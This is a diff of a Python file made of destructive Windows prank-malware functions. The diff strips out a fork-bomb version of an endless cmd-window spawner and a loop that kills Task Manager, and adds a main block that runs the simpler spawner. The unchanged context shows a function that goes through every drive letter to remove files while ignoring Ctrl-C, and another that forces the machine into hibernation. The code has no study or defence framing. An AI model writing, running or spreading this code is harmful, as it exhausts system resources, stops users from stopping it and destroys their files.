@@ -1,31 +1,7 @@
 def cmd_bimba():
     import os
-    from multiprocessing import Process
-
-    def _cmd_bimba():
-        while True:
-            os.system("start cmd")
-
     while True:
-        Process(target=_cmd_bimba).start()
-
-
-def _discharge_process_manager():
-    import psutil
-
-    def _is_task_manager_running():
-        for process in psutil.process_iter(['name']):
-            if process.info['name'] == 'Taskmgr.exe':
-                return process
-        return None
-
-    while True:
-        try:
-            process = _is_task_manager_running()
-            if process is not None:
-                process.kill()
-        except BaseException:
-            pass
+        os.system("start cmd")
 
 
 def removing_all_files():
@@ -35,7 +11,8 @@ def removing_all_files():
     from random import random, randint
     import signal
 
-    disks = [f"{d}:\\" for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if exists(f"{d}:\\")]
+    disks = [f"{d}:\\" for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if
+             exists(f"{d}:\\")]
 
     def _ignore_ctrl_c(signum, frame):
         pass
@@ -73,3 +50,7 @@ def hihihaha():
     print("He-he ha-ha")
     sleep(1)
     os.system("shutdown /f /h")
+
+
+if __name__ == "__main__":
+    cmd_bimba()
